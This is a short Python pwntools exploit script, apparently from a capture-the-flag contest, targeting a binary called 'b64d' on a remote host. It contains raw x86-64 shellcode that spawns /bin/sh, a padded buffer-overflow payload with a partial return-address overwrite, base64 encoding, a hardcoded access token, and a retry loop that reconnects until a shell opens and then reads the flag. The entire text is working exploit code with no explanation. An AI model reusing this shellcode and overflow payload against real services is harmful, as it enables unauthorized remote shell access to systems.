from pwn import *
import struct
import string
import sys, os
import base64

binName = './b64d'
libcName = './libc.x64.so'
site = '10.0.12.1'
port = 9999
context(arch='i686', os='linux', log_level='debug')
context(terminal=['gnome-terminal', '-x', 'zsh', '-c'])
# elf = ELF(binName)
# libc = ELF(libcName)
i = 0
while True:
	print i
	i +=1 
	#r = process(binName,env={'LD_PRELOAD':libcName})
	try:
		r = remote(site, port)
	except Exception as e:
		continue
	# raw_input("attach")
	sc = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
	payload	= sc.ljust(56,'A')+'\xe3\xdb'
	payload = base64.b64encode(payload)
	r.sendlineafter('Token:','k3LasWsPgTDojwo3YWhdBVPcYNNrAhPf')
	r.sendline(payload)
	try:
		if 'crash' in r.recvn(10):
			raise Exception
		r.sendline('echo fuck_melody')
		r.recvuntil('fuck_melody')
		r.sendline('cat */*/flag')
	except Exception as e:
		r.close()
		continue
	break
r.interactive()
